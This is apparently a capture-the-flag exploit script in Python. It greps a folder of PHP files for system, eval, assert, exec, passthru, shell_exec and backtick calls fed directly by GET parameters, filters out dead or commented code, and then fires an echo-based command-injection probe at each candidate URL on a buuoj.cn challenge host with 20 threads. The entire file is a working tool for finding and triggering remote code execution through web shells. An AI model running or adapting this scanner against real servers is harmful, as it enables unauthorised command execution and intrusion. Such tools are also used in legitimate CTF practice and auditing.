#!/usr/bin/env python3
import os
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

BASE_URL = "http://be51c8c2-0bad-4c4b-a792-d7ca170f3f03.node5.buuoj.cn:81"

def is_dead_code(lines, line_idx):
    for i in range(line_idx-1, max(0, line_idx-20), -1):
        line = lines[i].strip()
        match = re.search(r"if\s*\(\s*'([^']+)'\s*==\s*'([^']+)'\s*\)", line)
        if match and match.group(1) != match.group(2):
            return True
        match = re.search(r"if\s*\(\s*function_exists", line)
        if match:
            return True
    return False

def is_in_comment(lines, line_idx):
    content = '\n'.join(lines[max(0, line_idx-20):line_idx+1])
    last_open = content.rfind('/*')
    last_close = content.rfind('*/')
    return last_open > last_close

def is_param_overwritten(lines, line_idx, param):
    prev_content = '\n'.join(lines[max(0, line_idx-10):line_idx])
    return f"$_GET['{param}'] = " in prev_content

exploitable = []
src_dir = 'src'

print("[*] Analyzing PHP files...")
for filename in os.listdir(src_dir):
    if not filename.endswith('.php'):
        continue
    filepath = os.path.join(src_dir, filename)
    with open(filepath, 'r', errors='ignore') as f:
        content = f.read()
        lines = content.split('\n')
    
    for i, line in enumerate(lines):
        stripped = line.strip()
        
        patterns = [
            (r"system\s*\(\s*\$_GET\['([^']+)'\]", 'system'),
            (r"eval\s*\(\s*\$_GET\['([^']+)'\]", 'eval'),
            (r"assert\s*\(\s*\$_GET\['([^']+)'\]", 'assert'),
            (r"exec\s*\(\s*\$_GET\['([^']+)'\]", 'exec'),
            (r"passthru\s*\(\s*\$_GET\['([^']+)'\]", 'passthru'),
            (r"shell_exec\s*\(\s*\$_GET\['([^']+)'\]", 'shell_exec'),
            (r"echo\s*`\{?\$_GET\['([^']+)'\]\}?`", 'backtick'),
        ]
        
        for pattern, func in patterns:
            match = re.search(pattern, stripped)
            if match:
                param = match.group(1)
                if is_dead_code(lines, i):
                    continue
                if is_in_comment(lines, i):
                    continue
                if is_param_overwritten(lines, i, param):
                    continue
                exploitable.append({
                    'file': filename,
                    'func': func,
                    'param': param,
                })

print(f"[+] Found {len(exploitable)} patterns to test")

def test_exploit(item):
    url = f"{BASE_URL}/{item['file']}?{item['param']}=echo%20FLAGTEST12345"
    try:
        resp = requests.get(url, timeout=3)
        if 'FLAGTEST12345' in resp.text:
            return item
    except:
        pass
    return None

print("[*] Testing with 20 threads...")
found = []
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(test_exploit, item): item for item in exploitable}
    completed = 0
    for future in as_completed(futures):
        completed += 1
        result = future.result()
        if result:
            found.append(result)
            print(f"\n[!] FOUND: {result['file']}?{result['param']} ({result['func']})")
        if completed % 500 == 0:
            print(f"[*] Progress: {completed}/{len(exploitable)}")

if found:
    print(f"\n[+] Found {len(found)} working exploits!")
    for f in found:
        print(f"  {f['file']}?{f['param']} ({f['func']})")
else:
    print("\n[-] No working exploits found with echo test")
